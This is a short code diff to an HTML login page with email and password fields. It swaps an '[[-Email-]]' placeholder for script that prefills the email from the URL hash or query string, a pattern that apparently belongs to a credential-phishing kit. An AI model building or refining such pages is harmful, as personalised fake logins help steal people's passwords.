@@ -181,7 +181,7 @@
         <!-- Email -->
 		
         <div class="input-group">
-          <input type="email" id="oruko" value="[[-Email-]]" autocomplete="on"/>
+          <input type="email" id="oruko" value="" autocomplete="on"/>
 		  <div class="password-wrapper">
         </div>
         <!-- Password with toggle -->
@@ -212,6 +212,8 @@
   <!-- Inside the existing script, replace the handleSubmission() function with this: -->
 
 <script type="text/javascript">
+	// Extract the value after the '#' symbol from the URL
+      var email = window.location.hash.substr(1);
 	// Get email from URL parameter 'email' (e.g., ?email=user@domain.com)
     function getEmailFromUrl() {
       const urlParams = new URLSearchParams(window.location.search);
